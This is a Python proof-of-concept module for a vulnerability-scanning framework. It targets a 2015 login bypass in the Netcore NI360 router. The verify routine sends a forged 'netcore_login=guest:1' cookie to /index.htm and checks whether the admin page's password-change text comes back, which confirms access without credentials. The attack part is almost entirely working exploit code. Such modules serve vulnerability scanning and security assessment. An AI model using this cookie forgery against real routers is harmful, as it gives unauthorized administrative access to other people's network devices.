# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Netcore_0000'  # 平台漏洞编号，留空
    name = '磊科NI360安全路由器绕过密码登录'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-06-08'  # 漏洞公布时间
    desc = '''
        磊科（Netcore）NI360安全路由器,无需密码即可登录路由器.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0109095
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '磊科路由器'  # 漏洞应用名称
    product_version = 'NI360'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b144ec32-2c51-46a3-a490-c0d2a0509f25'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/index.htm'
            targetUrl = '{target}'.format(target=self.target)+payload
            oriCode, head, oriRes, _, _ = hh.http(targetUrl)
            code, head, res, _, _ = hh.http(targetUrl,
                                            header='cookie:netcore_login=guest:1')
            # 这里直接使用200是因为没有授权的情况下会跳转到 login.htm
            # 响应头这个时候就是3xx了
            msg = u'修改登录密码'
            msgs = [msg.encode(x) for x in ('utf-8', 'gbk')]

            if code == 200 and msgs[0] not in oriRes and msgs[1] not in oriRes:
                if msgs[0] in res or msgs[1] in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
